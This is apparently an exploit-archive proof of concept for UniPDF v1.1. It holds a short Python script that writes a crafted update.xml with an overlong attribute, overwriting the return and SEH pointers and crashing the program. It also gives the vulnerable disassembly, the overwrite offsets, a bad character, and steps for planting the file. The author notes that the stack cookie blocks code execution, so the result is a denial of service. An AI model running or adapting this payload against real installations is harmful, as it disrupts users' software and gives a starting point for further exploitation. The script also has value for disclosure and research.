# Exploit Title: UniPDF v1.1 BufferOverflow, SEH overwrite DoS PoC
# Google Dork: [none]
# Date: 01/28/2015
# Exploit Author: bonze 
# Email: dungvtr@gmail.com
# Vendor Homepage: http://unipdf.com/
# Software Link: http://unipdf.com/file/unipdf-setup.exe (Redirect to: http://unipdf-converter.en.softonic.com/download)
# Version: 1.1
# Tested on: Windows 7 SP1 EN
# CVE : [none]

# Note:
# Function MultiByteToWideChar will overwrite RET and SEH pointer, but I can't make exception occur before StackCookie checking 
# Please tell me if you have any ideal

#013E8012  |.  68 00020000   			PUSH 200       					                        						; /WideBufSize = 200 (512.)
#013E8017  |.  8D8C24 9C0000>		LEA ECX,DWORD PTR SS:[ESP+9C]         						; |
#013E801E  |.  51            					PUSH ECX                          				       							; |WideCharBuf
#013E801F  |.  52            					PUSH EDX                                 											; |StringSize
#013E8020  |.  50            					PUSH EAX                                 											; |StringToMap
#013E8021  |.  6A 00         					PUSH 0                                   											; |Options
#013E8023  |.  6A 00         					PUSH 0                                   											; |CodePage = CP_ACP
#013E8025  |.  FF15 54B45101 			CALL NEAR DWORD PTR DS:[<&KERNEL32.Multi>		; \MultiByteToWideChar
#013E802B  |.  8D87 08020000 			LEA EAX,DWORD PTR DS:[EDI+208]


# At Offset: 327-> overwrite nSEH 
# At Offset: 329-> overwrite SEH 
# badchar = 0x22

buff2 = "A" * 325
buff2+= "CC" # nSEH
buff2+= "BB" # SEH
crash2   = "<config>\n"
crash2 += "    <current Dat=\"1422420474\" />\n"
crash2 += "    <Dat Txt=\""+buff2+"\" />\n"
crash2 += "</config>\n"

# Copy file update.xml to UniPDF Application Folder and run UniPDF.exe
file = open("update.xml","w")
file.write(crash2)
file.close()

print "UniPDF v1.1 Crash PoC by bonze at FPT-IS"
print "Email: dungvtr@gmail.com"
print "File Created"
